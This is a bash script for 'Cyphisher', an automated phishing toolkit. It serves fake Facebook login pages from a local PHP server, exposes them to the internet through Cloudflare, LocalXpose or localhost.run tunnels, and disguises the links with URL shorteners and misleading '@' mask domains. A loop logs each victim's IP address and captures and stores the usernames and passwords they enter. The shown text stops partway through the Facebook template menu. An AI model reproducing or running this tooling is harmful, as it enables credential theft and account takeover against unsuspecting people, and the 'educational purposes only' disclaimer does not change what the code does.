#!/bin/bash

##   Cyphisher 	: 	Automated Phishing Tool
##   Author 	: 	AsHfIEXE 
##   Version 	: 	0.2.1
##   Github 	: 	https://github.com/AsHfIEXE/Cyphisher


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2026 AsHfIEXE (https://github.com/AsHfIEXE)
##



__version__="0.2.1"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
BOLD="$(printf '\033[1m')"  DIM="$(printf '\033[2m')"  ITALIC="$(printf '\033[3m')"  RESET="$(printf '\033[0m')"
BLINK="$(printf '\033[5m')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

if [[ -e ".server/.locrun" ]]; then
	rm -rf ".server/.locrun"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx ssh"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

## ═══════════════════════════════════════
## UI Framework - Animations & Helpers
## ═══════════════════════════════════════

## Typewriter animation
typewriter() {
    local text="$1"
    local delay="${2:-0.03}"
    for (( i=0; i<${#text}; i++ )); do
        printf "%s" "${text:$i:1}"
        sleep "$delay"
    done
    echo ""
}

loading_bar() {
    local msg="$1"
    local width=30
    echo -ne "\n"
    for (( i=0; i<=width; i++ )); do
        local pct=$((i * 100 / width))
        local filled=$i
        local empty=$((width - i))
        local bar=""
        for (( j=0; j<filled; j++ )); do bar="${bar}█"; done
        for (( j=0; j<empty; j++ )); do bar="${bar}░"; done
        printf "\r\e[K  ${CYAN}%s ${GREEN}[%s] ${WHITE}%3d%%" "$msg" "$bar" "$pct"
        sleep 0.04
    done
    printf " ${GREEN}✓${RESET}\n"
}

## Spinner for waiting loops
wait_spinner() {
    local msg="$1"
    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0
    while true; do
        printf "\r  ${CYAN}${frames[$i]} ${WHITE}%s" "$msg"
        i=$(( (i + 1) % ${#frames[@]} ))
        sleep 0.1
    done
}

## Print a status line
log_info()  { echo -e "  ${CYAN}[${WHITE}ℹ${CYAN}]${WHITE} $1${RESET}"; }
log_ok()    { echo -e "  ${GREEN}[${WHITE}✓${GREEN}]${WHITE} $1${RESET}"; }
log_warn()  { echo -e "  ${ORANGE}[${WHITE}⚠${ORANGE}]${WHITE} $1${RESET}"; }
log_error() { echo -e "  ${RED}[${WHITE}✗${RED}]${WHITE} $1${RESET}"; }
log_wait()  { echo -ne "  ${CYAN}[${WHITE}…${CYAN}]${WHITE} $1${RESET}"; }

## Draw a box with title
draw_header() {
    local title="$1"
    local width=54
    local pad=$(( (width - ${#title} - 2) / 2 ))
    echo -e "${CYAN}  ╔$(printf '═%.0s' $(seq 1 $width))╗${RESET}"
    echo -e "${CYAN}  ║$(printf ' %.0s' $(seq 1 $pad))${BOLD}${WHITE} $title ${RESET}${CYAN}$(printf ' %.0s' $(seq 1 $((width - pad - ${#title} - 2))))║${RESET}"
    echo -e "${CYAN}  ╚$(printf '═%.0s' $(seq 1 $width))╗${RESET}"
}

draw_line() {
    echo -e "${DIM}${CYAN}  ────────────────────────────────────────────────────────${RESET}"
}

## Menu option formatter
menu_opt() {
    local num="$1"
    local label="$2"
    local extra="$3"
    if [[ -n "$extra" ]]; then
        printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-20s ${DIM}${CYAN}%s${RESET}\n" "$num" "$label" "$extra"
    else
        printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "$num" "$label"
    fi
}

## Prompt
prompt_input() {
    local label="${1:-Choose an option}"
    echo ""
    read -p "  ${CYAN}❯ ${GREEN}${label} : ${WHITE}" REPLY
}

## Check port availability
check_port() {
    if command -v lsof &>/dev/null; then
        if lsof -i :"$PORT" &>/dev/null; then
            log_warn "Port ${ORANGE}$PORT${WHITE} is in use. Finding available port..."
            while lsof -i :"$PORT" &>/dev/null; do
                PORT=$((PORT + 1))
            done
            log_ok "Using available port: ${GREEN}$PORT"
        fi
    elif command -v ss &>/dev/null; then
        if ss -tlnp | grep -q ":$PORT " 2>/dev/null; then
            log_warn "Port ${ORANGE}$PORT${WHITE} is in use. Finding available port..."
            while ss -tlnp | grep -q ":$PORT " 2>/dev/null; do
                PORT=$((PORT + 1))
            done
            log_ok "Using available port: ${GREEN}$PORT"
        fi
    fi
}



## ═══════════════════════════════════════
## Banners
## ═══════════════════════════════════════

banner() {
	echo -e "${CYAN}"
	cat <<- 'LOGO'
	   ██████╗██╗   ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
	  ██╔════╝╚██╗ ██╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
	  ██║      ╚████╔╝ ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
	  ██║       ╚██╔╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
	  ╚██████╗   ██║   ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
	   ╚═════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
	LOGO
	echo -e "${RESET}"
	echo -e "  ${DIM}${WHITE}──────────────────────────────────────────────────────────────────${RESET}"
	echo -e "  ${GREEN}  ⚡ ${BOLD}${WHITE}v${__version__}${RESET}  ${DIM}${WHITE}│${RESET}  ${CYAN}by ${BOLD}AsHfIEXE${RESET}  ${DIM}${WHITE}│${RESET}  ${ORANGE}Advanced Phishing Toolkit${RESET}"
	echo -e "  ${DIM}${WHITE}──────────────────────────────────────────────────────────────────${RESET}"
}

banner_small() {
	echo -e "\n${CYAN}${BOLD}  ╭─── Cyphisher v${__version__} ───╮${RESET}"
	echo -e "${CYAN}${BOLD}  ╰────────────────────────╯${RESET}"
}

## Check Internet Status
INTERNET_STATUS="offline"
check_status() {
	log_wait "Checking internet connection..."
	timeout 3s curl -fIs "https://api.github.com" > /dev/null 2>&1
	if [ $? -eq 0 ]; then
		echo -e "\r\e[K  ${GREEN}[${WHITE}✓${GREEN}]${WHITE} Internet Status: ${GREEN}${BOLD}Online ✓${RESET}"
		INTERNET_STATUS="online"
	else
		echo -e "\r\e[K  ${RED}[${WHITE}✗${RED}]${WHITE} Internet Status: ${RED}${BOLD}Offline ✗${RESET}"
		INTERNET_STATUS="offline"
	fi
}

## Dependencies
dependencies() {
	log_info "Checking required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			log_wait "Installing package: ${ORANGE}proot${WHITE}"
			pkg install proot resolv-conf -y > /dev/null 2>&1
			echo ""
		fi

		if [[ ! $(command -v tput) ]]; then
			log_wait "Installing package: ${ORANGE}ncurses-utils${WHITE}"
			pkg install ncurses-utils -y > /dev/null 2>&1
			echo ""
		fi
	fi

	local all_installed=true
	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		log_ok "All packages installed ${GREEN}(php, curl, unzip)"
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				log_wait "Installing package: ${ORANGE}$pkg${WHITE}\n"
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y > /dev/null 2>&1
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y > /dev/null 2>&1
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y > /dev/null 2>&1
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm > /dev/null 2>&1
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg" > /dev/null 2>&1
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg" > /dev/null 2>&1
				else
					log_error "Unsupported package manager."
					log_error "Please install ${ORANGE}$pkg${WHITE} manually."
					{ reset_color; exit 1; }
				fi
				# Verify installation succeeded
				if ! type -p "$pkg" &>/dev/null; then
					log_error "Failed to install ${ORANGE}$pkg${WHITE}."
					log_error "Try: ${CYAN}sudo apt install $pkg${WHITE}"
					all_installed=false
				else
					log_ok "Installed ${GREEN}$pkg"
				fi
			}
		done
		if [[ "$all_installed" == false ]]; then
			log_error "Some packages failed to install. Cannot continue."
			{ reset_color; exit 1; }
		fi
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		log_error "Failed to download ${ORANGE}${output}${WHITE}."
		log_error "Check your internet connection and try again."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflare
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		log_ok "Cloudflare already installed."
	else
		log_wait "Installing Cloudflare...\n"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
		log_ok "Cloudflare installed successfully."
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		log_ok "LocalXpose already installed."
	else
		log_wait "Installing LocalXpose...\n"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
		log_ok "LocalXpose installed successfully."
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "  ${GREENBG}${BLACK} Thank you for using Cyphisher. Stay safe! ${RESETBG}"
	echo ""
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF

		${CYAN}  ╭─────────────────────────────────────╮${RESET}
		${CYAN}  │${RESET}  ${GREEN}Author   ${DIM}:${RESET}  ${BOLD}${WHITE}AsHfIEXE${RESET}              ${CYAN}│${RESET}
		${CYAN}  │${RESET}  ${GREEN}Github   ${DIM}:${RESET}  ${CYAN}github.com/AsHfIEXE${RESET}   ${CYAN}│${RESET}
		${CYAN}  │${RESET}  ${GREEN}Version  ${DIM}:${RESET}  ${ORANGE}${__version__}${RESET}                 ${CYAN}│${RESET}
		${CYAN}  ╰─────────────────────────────────────╯${RESET}

		${BOLD}${RED}  ⚠  Disclaimer:${RESET}
		${WHITE}  This tool is made for educational purposes only.
		  The author will not be responsible for any misuse.

		${BOLD}${CYAN}  ♥  Special Thanks:${RESET}
		${DIM}${WHITE}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
		  E343IO, sepp0, ThelinuxChoice, Yisus7u7${RESET}

	EOF

	menu_opt "00" "Main Menu"
	menu_opt "99" "Exit"
	prompt_input
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			log_ok "Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			log_error "Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "  ${CYAN}❯ ${ORANGE}Custom Port? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "  ${CYAN}❯ ${ORANGE}Enter 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			log_error "Invalid port: $CU_P. Try again..."
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -e "\n"
		log_info "Using default port ${CYAN}$PORT${WHITE}"
	fi
}

## Setup website and start php server
setup_site() {
	log_info "Setting up server..."
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	log_wait "Starting PHP server..."
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
	sleep 0.5
	if kill -0 $! 2>/dev/null; then
		echo -e "\r  ${GREEN}[${WHITE}\u2713${GREEN}]${WHITE} PHP server started on ${CYAN}$HOST:$PORT${RESET}"
	else
		echo ""
		log_error "PHP server failed to start on port $PORT."
		log_error "Try: ${CYAN}sudo apt install php${WHITE}"
		{ reset_color; exit 1; }
	fi
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	log_ok "Victim's IP : ${CYAN}$IP"
	log_info "Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo ""
	draw_line
	echo -e "  ${GREEN}${BOLD}  █ LOGIN CAPTURED!${RESET}"
	draw_line
	log_ok "Account  : ${CYAN}$ACCOUNT"
	log_ok "Password : ${CYAN}$PASSWORD"
	log_info "Saved in : ${ORANGE}auth/usernames.dat"
	draw_line
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -e "\n  ${ORANGE}  Waiting for next login... ${DIM}(Ctrl+C to exit)${RESET}"
}

## Print data
capture_data() {
	echo ""
	draw_line
	echo -e "  ${CYAN}${BOLD}  ▶ LISTENING FOR CONNECTIONS${RESET}"
	draw_line
	echo -e "  ${DIM}${WHITE}  Waiting for victim to open the link...${RESET}"
	echo -e "  ${DIM}${WHITE}  Press ${BOLD}Ctrl+C${RESET}${DIM} to stop and return.${RESET}\n"
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			log_ok "${GREEN}Victim IP detected!"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			log_ok "${GREEN}${BOLD}Login credentials captured!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start Cloudflare
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	check_port
	log_info "Initializing... ${DIM}(${CYAN}http://$HOST:$PORT${DIM})${RESET}"
	{ sleep 1; setup_site; }
	log_wait "Launching Cloudflare...\n"

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	local cld_pid=$!
	sleep 2

	# Check if cloudflared crashed immediately (segfault fix)
	if ! kill -0 $cld_pid 2>/dev/null; then
		log_error "Cloudflare crashed on startup (possible segfault)."
		log_warn "Try deleting ${ORANGE}.server/cloudflared${WHITE} and restarting."
		log_info "Returning to tunnel selection...\n"
		sleep 2
		kill_pid
		tunnel_menu
		return
	fi

	echo ""
	local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
	local fi=0
	for i in {1..20}; do
		cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ".server/.cld.log" 2>/dev/null | head -n 1)
		if [[ -n "$cldflr_url" ]]; then
			printf "\r  ${GREEN}[\u2713]${WHITE} Cloudflare URL obtained!                    \n"
			break
		fi
		printf "\r  ${CYAN}${frames[$fi]} ${WHITE}Waiting for Cloudflare URL..."
		fi=$(( (fi + 1) % ${#frames[@]} ))
		sleep 1
	done

	if [[ -z "$cldflr_url" ]]; then
		log_error "Failed to get Cloudflare URL."
		log_warn "The tunnel may have timed out or failed to initialize."
		echo -e "\n${DIM}${RED}--- Cloudflare Error Log ---${RESET}"
		cat .server/.cld.log 2>/dev/null | tail -n 10
		echo -e "${DIM}${RED}-----------------------------${RESET}\n"
		log_info "Returning to tunnel selection...\n"
		sleep 4
		kill_pid
		tunnel_menu
		return
	fi

	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	cusport
	check_port
	log_info "Initializing... ${DIM}(${CYAN}http://$HOST:$PORT${DIM})${RESET}"
	{ sleep 1; setup_site; localxpose_auth; }
	echo ""
	read -n1 -p "  ${CYAN}\u276f ${ORANGE}Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo ""
	log_wait "Launching LocalXpose...\n"

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 2
	echo ""
	local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
	local fi=0
	for i in {1..20}; do
		loclx_url=$(grep -o '[0-9a-zA-Z.]*\.loclx\.io' .server/.loclx 2>/dev/null | head -n 1)
		if [[ -n "$loclx_url" ]]; then
			printf "\r  ${GREEN}[\u2713]${WHITE} LocalXpose URL obtained!                    \n"
			break
		fi
		printf "\r  ${CYAN}${frames[$fi]} ${WHITE}Waiting for LocalXpose URL..."
		fi=$(( (fi + 1) % ${#frames[@]} ))
		sleep 1
	done

	if [[ -z "$loclx_url" ]]; then
		log_error "Failed to get LocalXpose URL."
		log_warn "Try again or use another tunneling service."
		log_info "Returning to tunnel selection...\n"
		sleep 2
		kill_pid
		tunnel_menu
		return
	fi

	custom_url "$loclx_url"
	capture_data
}

## Start localhost.run
start_localhost_run() {
	cusport
	check_port
	log_info "Initializing... ${DIM}(${CYAN}http://$HOST:$PORT${DIM})${RESET}"
	{ sleep 1; setup_site; }
	log_wait "Launching Localhost.run...\n"

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ssh -R 80:localhost:"$PORT" nokey@localhost.run -T -n > .server/.locrun 2>&1 &
	else
		sleep 2 && ssh -R 80:localhost:"$PORT" nokey@localhost.run -T -n > .server/.locrun 2>&1 &
	fi

	sleep 2
	echo ""
	local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
	local fi=0
	for i in {1..20}; do
		locrun_url=$(grep -o 'https://[-0-9a-z]*\.lhr\.life' .server/.locrun 2>/dev/null | head -n 1)
		if [[ -n "$locrun_url" ]]; then
			printf "\r  ${GREEN}[\u2713]${WHITE} Localhost.run URL obtained!                    \n"
			break
		fi
		printf "\r  ${CYAN}${frames[$fi]} ${WHITE}Waiting for Localhost.run URL..."
		fi=$(( (fi + 1) % ${#frames[@]} ))
		sleep 1
	done

	if [[ -z "$locrun_url" ]]; then
		log_error "Failed to get Localhost.run URL."
		log_warn "Make sure SSH is installed: ${CYAN}sudo apt install openssh-client${WHITE}"
		log_info "Returning to tunnel selection...\n"
		sleep 2
		kill_pid
		tunnel_menu
		return
	fi

	custom_url "$locrun_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	check_port
	log_info "Initializing... ${DIM}(${CYAN}http://$HOST:$PORT${DIM})${RESET}"
	setup_site
	{ sleep 1; clear; banner_small; }
	log_ok "Successfully hosted at: ${CYAN}http://$HOST:$PORT"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	echo ""
	draw_header "SELECT TUNNEL SERVICE"
	echo ""
	menu_opt "01" "Localhost" "Local Network Only"
	menu_opt "02" "Cloudflare" "Auto Detects"
	menu_opt "03" "LocalXpose" "Max 15 Min"
	menu_opt "04" "Localhost.run" "SSH Tunnel"
	echo ""
	draw_line
	menu_opt "00" "Back to Main Menu"
	prompt_input "Select tunnel"

	case $REPLY in 
		0 | 00)
			log_ok "Returning to main menu..."
			{ sleep 1; main_menu; };;
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		4 | 04)
			start_localhost_run;;
		*)
			log_error "Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	processed_url=${short#http*//}
	if [[ -z "$processed_url" || "$processed_url" == "Error" || "$processed_url" == *"Error"* ]]; then
		processed_url="Unable to Short URL"
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	
	masked_url=""
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io|lhr.life) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		if [[ $processed_url != "Unable to Short URL" ]]; then
			masked_url="$mask@$processed_url"
			processed_url="https://$processed_url"
		fi
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="Unable to generate links. Try after turning on hotspot"
		processed_url="Unable to Short URL"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
	[[ -n $masked_url ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook
site_facebook() {
	{ clear; banner_small; }
	echo ""
	draw_header "FACEBOOK TEMPLATES"
	echo ""
	menu_opt "01" "Traditional Login"
	menu_opt "02" "Voting Poll Login"
	menu_opt "03" "Fake Security Login"
	menu_opt "04" "Messenger Login"
	echo ""
	draw_line
	menu_opt "00" "Back to Main Menu"
	prompt_input

	case $REPLY in 
		0 | 00)
			log_ok "Returning to main menu..."
			{ sleep 1; main_menu; };;
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
